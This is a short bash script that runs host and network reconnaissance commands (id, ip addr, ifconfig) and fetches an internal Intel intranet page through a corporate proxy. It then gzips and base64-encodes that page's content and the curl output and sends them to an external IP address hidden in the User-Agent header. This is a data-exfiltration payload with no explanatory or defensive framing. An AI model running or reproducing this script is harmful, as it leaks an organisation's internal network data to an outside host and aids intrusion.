#!/bin/bash
export PATH=$PATH:/bin:/usr/sbin/
id
ip addr show
ifconfig
curl -vk https://intelpedia.intel.com
http_proxy=http://proxy.jf.intel.com:911 no_proxy=intel.com curl -vk -A $(bash -c 'curl -vk https://intelpedia.intel.com 2>&1|gzip -9|base64 -w0') 34.221.32.238/hiagainagain 
